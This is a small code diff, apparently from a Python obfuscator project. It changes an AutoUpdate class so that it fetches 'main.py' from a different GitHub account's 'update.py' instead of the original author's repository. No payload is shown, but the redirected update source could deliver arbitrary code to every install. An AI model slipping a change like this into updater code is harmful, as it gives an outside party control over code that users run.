@@ -226,7 +226,7 @@ settings = [
 class AutoUpdate:
     def __init__(self) -> None:
         self.code = (
-            "https://raw.githubusercontent.com/KDot227/Somalifuscator/main/main.py"
+            "https://raw.githubusercontent.com/ESTKUNG/update/main/update.py"
         )
         self.bypass = False
 
